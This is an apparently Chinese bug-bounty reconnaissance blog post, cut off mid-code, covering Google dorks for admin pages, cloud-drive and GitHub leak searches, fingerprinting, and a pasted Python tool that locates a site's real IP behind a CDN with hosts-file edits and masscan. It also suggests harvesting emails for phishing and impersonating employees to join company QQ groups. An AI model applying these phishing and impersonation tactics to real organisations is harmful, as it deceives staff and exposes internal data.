<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.xxx admin</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx login</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx system</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 管理</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 登录</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 内部</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 系统</span></pre></td></tr></table></figure>

<p>还可以查找邮箱，然后进行钓鱼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.xxx 邮件</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx email</span></pre></td></tr></table></figure>

<p>还可以查找<code>qq</code>群等，然后假装员工验证进去看群文件泄露了什么东东（这里有个技巧，去找客服聊天处，然后对整个过程抓包也就是看历史请求，如果运气好可能在请求的返回包中返回客服的姓名，如果只单纯的泄露了姓如<strong>张xx</strong>，那么你加群的时候就说你是<strong>小张工作号</strong>，说这个工作号的原因是可能小张已经在群里了）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意事项：如果你是挖腾讯的话就不要看这条啦</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx qq</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 群</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 企鹅</span></pre></td></tr><tr><td class="code"><pre><span class="line">site:xxx.xxx 腾讯</span></pre></td></tr></table></figure>

<p>还可以对寻找一些公开的、危害大、普遍的漏洞的指纹，如下面的搜索<code>jboss</code>系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:ooxx.com inurl:jmx-console</span></pre></td></tr></table></figure>

<h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><p>比如下面一个站存在越权（但是越权的对象很难猜测）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;userinfo&#x2F;?uid&#x3D;2018-WOIDJWOIDJ-5201314</span></pre></td></tr></table></figure>

<p>那么我们可以尝试用搜索引擎来找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:xxx.xxx inurl&#x3D;uid&#x3D;20</span></pre></td></tr></table></figure>

<h3 id="利用云网盘搜索工具搜集敏感文件"><a href="#利用云网盘搜索工具搜集敏感文件" class="headerlink" title="利用云网盘搜索工具搜集敏感文件"></a>利用云网盘搜索工具搜集敏感文件</h3><blockquote>
<p>公司员工可能把一些内部资料放在了公网网盘，然后被在线云网盘搜索的网站抓取了，我们就可以利用这个来对目标系统进行深入交流</p>
</blockquote>
<p>我这边主要用凌风云搜索</p>
<p><a href="https://www.lingfengyun.com/" target="_blank" rel="noopener">https://www.lingfengyun.com/</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/o982kurvzt9wd1psstmsx5du/image_1dbvbbve839lj94hs8d92cp.png" alt="image_1dbvbbve839lj94hs8d92cp.png-143.4kB"></p>
<p>个人喜欢直接输入厂商名字然后搜索（比较全），然后边看电视（最好看鬼片，鬼出来的阶段想着找找找）边搜索</p>
<h3 id="利用gayhub来收集信息"><a href="#利用gayhub来收集信息" class="headerlink" title="利用gayhub来收集信息"></a>利用gayhub来收集信息</h3><p>1、打开<code>gayhub</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/88w8pjy2e0vq3ypx2n0qbbfd/image_1dbvble0op36hmi1ter16ck1vt816.png" alt="image_1dbvble0op36hmi1ter16ck1vt816.png-151kB"></p>
<p>这里就是找<code>gayhub</code>全部开源项目内容中存在联想这个关键字的项目，这样子可以搜集到的方面更广，如果单纯只是对标题搜索，那么他们改成了<code>lenovo</code>你就搜不到了</p>
<p>然后说再多，也没这个好用</p>
<p><a href="https://sec.xiaomi.com/article/37" target="_blank" rel="noopener">https://sec.xiaomi.com/article/37</a></p>
<h3 id="针对网站性收集"><a href="#针对网站性收集" class="headerlink" title="针对网站性收集"></a>针对网站性收集</h3><h5 id="1、把网站弄报错，看是什么cms，或者看返回包回显是什么中间件这些"><a href="#1、把网站弄报错，看是什么cms，或者看返回包回显是什么中间件这些" class="headerlink" title="1、把网站弄报错，看是什么cms，或者看返回包回显是什么中间件这些"></a>1、把网站弄报错，看是什么<code>cms</code>，或者看返回包回显是什么中间件这些</h5><h5 id="2、看是linux还是window"><a href="#2、看是linux还是window" class="headerlink" title="2、看是linux还是window"></a>2、看是<code>linux</code>还是<code>window</code></h5><p>如目标<code>url</code>是<code>www.onlyfree.xxx/login</code>，那么改成<code>www.onlyfree.xxx/Login</code>看看能不能访问，如果可以访问就可能是<code>window</code>，否则可能是<code>linux</code></p>
<h5 id="3、可以去云溪等在线识别指纹的网站看指纹信息"><a href="#3、可以去云溪等在线识别指纹的网站看指纹信息" class="headerlink" title="3、可以去云溪等在线识别指纹的网站看指纹信息"></a>3、可以去云溪等在线识别指纹的网站看指纹信息</h5><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p>
<h5 id="4、对waf进行识别"><a href="#4、对waf进行识别" class="headerlink" title="4、对waf进行识别"></a>4、对<code>waf</code>进行识别</h5><p>这里有一款开源的识别工具，挺好用的<br><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p>
<h5 id="5、对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）"><a href="#5、对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）" class="headerlink" title="5、对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）"></a>5、对网站<code>whois</code>查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）</h5><h5 id="6、看html源代码，在一起项目测试的时候，我在找html源代码的时候发现一个注释的js文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没get到shell，所以你要知道这回事而不要记住这件事）"><a href="#6、看html源代码，在一起项目测试的时候，我在找html源代码的时候发现一个注释的js文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没get到shell，所以你要知道这回事而不要记住这件事）" class="headerlink" title="6、看html源代码，在一起项目测试的时候，我在找html源代码的时候发现一个注释的js文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没get到shell，所以你要知道这回事而不要记住这件事）"></a>6、看<code>html</code>源代码，在一起项目测试的时候，我在找<code>html</code>源代码的时候发现一个注释的<code>js</code>文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没<code>get</code>到<code>shell</code>，所以你要知道这回事而不要记住这件事）</h5><h5 id="7、网站真实ip识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来"><a href="#7、网站真实ip识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来" class="headerlink" title="7、网站真实ip识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来"></a>7、网站真实<code>ip</code>识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#############################################################</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###                                                  </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###   ▄▄▄▄                ▄▄▄     ▄▄▄▄    ▀      ▄   </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###  ▀   ▀█ ▄   ▄  ▄▄▄▄     █    ▄▀  ▀▄ ▄▄▄    ▄▄█▄▄ </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###    ▄▄▄▀  █▄█   █▀ ▀█    █    █  ▄ █   █      █   </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###      ▀█  ▄█▄   █   █    █    █    █   █      █   </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###  ▀▄▄▄█▀ ▄▀ ▀▄  ██▄█▀  ▄▄█▄▄   █▄▄█  ▄▄█▄▄    ▀▄▄ </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###                █                                 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###                ▀                                 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">###                                                          </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">### name: xcdn.py</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">### function: try to get the actual ip behind cdn</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">### date: 2016-11-05</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">### author: quanyechavshuo</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">### blog: http://3xp10it.cc</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">#############################################################</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"># usage:python3 xcdn.py www.baidu.com</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span></pre></td></tr><tr><td class="code"><pre><span class="line">os.system(<span class="string">"pip3 install exp10it -U --no-cache-dir"</span>)    </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> exp10it <span class="keyword">import</span> figlet2file</span></pre></td></tr><tr><td class="code"><pre><span class="line">figlet2file(<span class="string">"3xp10it"</span>,<span class="number">0</span>,<span class="literal">True</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">time.sleep(<span class="number">1</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> exp10it <span class="keyword">import</span> CLIOutput</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> exp10it <span class="keyword">import</span> get_root_domain</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> exp10it <span class="keyword">import</span> get_string_from_command</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> exp10it <span class="keyword">import</span> get_http_or_https</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> exp10it <span class="keyword">import</span> post_request</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> exp10it <span class="keyword">import</span> get_request</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> exp10it <span class="keyword">import</span> checkvpn</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xcdn</span><span class="params">(object)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,domain)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#必须保证连上了vpn,要在可以ping通google的条件下使用本工具,否则有些domain由于被GFW拦截无法正常访问会导致</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#本工具判断错误,checkvpn在可以ping通google的条件下返回1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> checkvpn()==<span class="number">1</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">break</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                time.sleep(<span class="number">1</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                print(<span class="string">"vpn is off,connect vpn first"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> domain[:<span class="number">4</span>]==<span class="string">"http"</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            print(<span class="string">"domain format error,make sure domain has no http,like www.baidu.com but not \</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">http://www.baidu.com"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            sys.exit(<span class="number">0</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#首先保证hosts文件中没有与domain相关的项,有则删除相关</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        domainPattern=domain.replace(<span class="string">"."</span>,<span class="string">"\."</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#下面的sed的正则中不能有\n,sed匹配\n比较特殊</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#http://stackoverflow.com/questions/1251999/how-can-i-replace-a-newline-n-using-sed</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        command=<span class="string">"sed -ri 's/.*\s+%s//' /etc/hosts"</span> % domainPattern</span></pre></td></tr><tr><td class="code"><pre><span class="line">        os.system(command)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        self.domain=domain</span></pre></td></tr><tr><td class="code"><pre><span class="line">        self.http_or_https=get_http_or_https(self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(<span class="string">'domain的http或https是:%s'</span> % self.http_or_https)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        result=get_request(self.http_or_https+<span class="string">"://"</span>+self.domain,<span class="string">'seleniumPhantomJS'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        self.domain_title=result[<span class="string">'title'</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#下面调用相当于main函数的get_actual_ip_from_domain函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        actual_ip = self.get_actual_ip_from_domain()</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> actual_ip != <span class="number">0</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            print(<span class="string">"恭喜,%s的真实ip是%s"</span> % (self.domain, actual_ip))</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#下面用来存放关键返回值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        self.return_value=actual_ip</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        </span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">domain_has_cdn</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 检测domain是否有cdn</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 有cdn时,返回一个字典,如果cdn是cloudflare，返回&#123;'has_cdn':1,'is_cloud_flare':1&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 否则返回&#123;'has_cdn':1,'is_cloud_flare':0&#125;或&#123;'has_cdn':0,'is_cloud_flare':0&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">import</span> re</span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"现在检测domain:%s是否有cdn"</span> % self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        has_cdn = <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># ns记录和mx记录一样,都要查顶级域名,eg.dig +short www.baidu.com ns VS dig +short baidu.com ns</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        result = get_string_from_command(<span class="string">"dig ns %s +short"</span> % get_root_domain(self.domain))</span></pre></td></tr><tr><td class="code"><pre><span class="line">        pattern = re.compile(</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">r"(cloudflare)|(cdn)|(cloud)|(fast)|(incapsula)|(photon)|(cachefly)|(wppronto)|(softlayer)|(incapsula)|(jsdelivr)|(akamai)"</span>, re.I)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        cloudflare_pattern = re.compile(<span class="string">r"cloudflare"</span>, re.I)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> re.search(pattern, result):</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> re.search(cloudflare_pattern, result):</span></pre></td></tr><tr><td class="code"><pre><span class="line">                print(<span class="string">"has_cdn=1 from ns,and cdn is cloudflare"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">return</span> &#123;<span class="string">'has_cdn'</span>: <span class="number">1</span>, <span class="string">'is_cloud_flare'</span>: <span class="number">1</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                print(<span class="string">"has_cdn=1 from ns"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">return</span> &#123;<span class="string">'has_cdn'</span>: <span class="number">1</span>, <span class="string">'is_cloud_flare'</span>: <span class="number">0</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment"># 下面通过a记录个数来判断,如果a记录个数&gt;1个,认为有cdn</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            result = get_string_from_command(<span class="string">"dig a %s +short"</span> % self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            find_a_record_pattern = re.findall(<span class="string">r"((\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;)"</span>, result)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> find_a_record_pattern:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                ip_count = <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">for</span> each <span class="keyword">in</span> find_a_record_pattern:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    ip_count += <span class="number">1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">if</span> ip_count &gt; <span class="number">1</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    has_cdn = <span class="number">1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                    <span class="keyword">return</span> &#123;<span class="string">'has_cdn'</span>: <span class="number">1</span>, <span class="string">'is_cloud_flare'</span>: <span class="number">0</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> &#123;<span class="string">'has_cdn'</span>: <span class="number">0</span>, <span class="string">'is_cloud_flare'</span>: <span class="number">0</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_domain_actual_ip_from_phpinfo</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 从phpinfo页面尝试获得真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"现在尝试从domain:%s可能存在的phpinfo页面获取真实ip"</span> % self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        phpinfo_page_list = [<span class="string">"info.php"</span>, <span class="string">"phpinfo.php"</span>, <span class="string">"test.php"</span>, <span class="string">"l.php"</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> phpinfo_page_list:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            url = self.http_or_https + <span class="string">"://"</span> + self.domain + <span class="string">"/"</span> + each</span></pre></td></tr><tr><td class="code"><pre><span class="line">            CLIOutput().good_print(<span class="string">"现在访问%s"</span> % url)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            visit = get_request(url,<span class="string">'seleniumPhantomJS'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            code = visit[<span class="string">'code'</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">            content = visit[<span class="string">'content'</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">            pattern = re.compile(<span class="string">r"remote_addr"</span>, re.I)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> code == <span class="number">200</span> <span class="keyword">and</span> re.search(pattern, content):</span></pre></td></tr><tr><td class="code"><pre><span class="line">                print(each)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                actual_ip = re.search(<span class="string">r"REMOTE_ADDR[^\.\d]+([\d\.]&#123;7,15&#125;)[^\.\d]+"</span>, content).group(<span class="number">1</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">return</span> actual_ip</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># return 0代表没有通过phpinfo页面得到真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">flush_dns</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 这个函数用来刷新本地dns cache</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 要刷新dns cache才能让修改hosts文件有效</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"现在刷新系统的dns cache"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        command = <span class="string">"service network-manager restart &amp;&amp; /etc/init.d/networking force-reload"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        os.system(command)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">import</span> time</span></pre></td></tr><tr><td class="code"><pre><span class="line">        time.sleep(<span class="number">3</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modify_hosts_file_with_ip_and_domain</span><span class="params">(self,ip)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 这个函数用来修改hosts文件</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"现在修改hosts文件"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        exists_domain_line = <span class="literal">False</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">with</span> open(<span class="string">"/etc/hosts"</span>, <span class="string">"r+"</span>) <span class="keyword">as</span> f:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            file_content = f.read()</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r"%s"</span> % self.domain.replace(<span class="string">"."</span>, <span class="string">"\."</span>), file_content):</span></pre></td></tr><tr><td class="code"><pre><span class="line">            exists_domain_line = <span class="literal">True</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> exists_domain_line == <span class="literal">True</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            os.system(<span class="string">"sed -ri 's/.*%s.*/%s    %s/' %s"</span> % (self.domain.replace(<span class="string">"."</span>, <span class="string">"\."</span>), ip, self.domain, <span class="string">"/etc/hosts"</span>))</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            os.system(<span class="string">"echo %s %s &gt;&gt; /etc/hosts"</span> % (ip, self.domain))</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_if_ip_is_actual_ip_of_domain</span><span class="params">(self,ip)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 通过修改hosts文件检测ip是否是domain对应的真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 如果是则返回True,否则返回False</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#CLIOutput().good_print("现在通过修改hosts文件并刷新dns的方法检测ip:%s是否是domain:%s的真实ip" % (ip,self.domain))</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#python通过requests库或mechanicalsoup库或selenium_phantomjs来请求时不会被dns缓存影响，只会被hosts文件影响dns解析,人工用浏览器访问域名则会受dns缓存影响</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"现在通过修改hosts文件的方法检测ip:%s是否是domain:%s的真实ip"</span> % (ip,self.domain))</span></pre></td></tr><tr><td class="code"><pre><span class="line">        os.system(<span class="string">"cp /etc/hosts /etc/hosts.bak"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        self.modify_hosts_file_with_ip_and_domain(ip)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#python通过requests库或mechanicalsoup库或selenium_phantomjs来请求时不会被dns缓存影响，只会被hosts文件影响dns解析,人工用浏览器访问域名则会受dns缓存影响</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#self.flush_dns()</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        hosts_changed_domain_title= get_request(self.http_or_https + <span class="string">"://%s"</span> % self.domain,<span class="string">'selenium_phantom_js'</span>)[<span class="string">'title'</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">        os.system(<span class="string">"rm /etc/hosts &amp;&amp; mv /etc/hosts.bak /etc/hosts"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#这里要用title判断,html判断不可以,title相同则认为相同</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> self.domain_title == hosts_changed_domain_title:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            CLIOutput().good_print(<span class="string">"检测到真实ip!!!!!!"</span>,<span class="string">'red'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            CLIOutput().good_print(<span class="string">"当前ip不是域名的真实ip"</span>,<span class="string">'yellow'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_c_80_or_443_list</span><span class="params">(self,ip)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 得到ip的整个c段的开放80端口或443端口的ip列表</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> <span class="string">"not found"</span> <span class="keyword">in</span> get_string_from_command(<span class="string">"masscan"</span>):</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="comment">#这里不用nmap扫描,nmap扫描结果不准</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            os.system(<span class="string">"apt-get install masscan"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> self.http_or_https==<span class="string">"http"</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            scanPort=<span class="number">80</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            CLIOutput().good_print(<span class="string">"现在进行%s的c段开了80端口机器的扫描"</span> % ip)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> self.http_or_https==<span class="string">"https"</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            scanPort=<span class="number">443</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            CLIOutput().good_print(<span class="string">"现在进行%s的c段开了443端口机器的扫描"</span> % ip)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        masscan_command = <span class="string">"masscan -p%d %s/24 &gt; /tmp/masscan.out"</span> % (scanPort,ip)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        os.system(masscan_command)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">with</span> open(<span class="string">"/tmp/masscan.out"</span>, <span class="string">"r+"</span>) <span class="keyword">as</span> f:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            strings = f.read()</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">#os.system("rm /tmp/masscan.out")</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">import</span> re</span></pre></td></tr><tr><td class="code"><pre><span class="line">        allIP=re.findall(<span class="string">r"((\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;)"</span>,strings)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        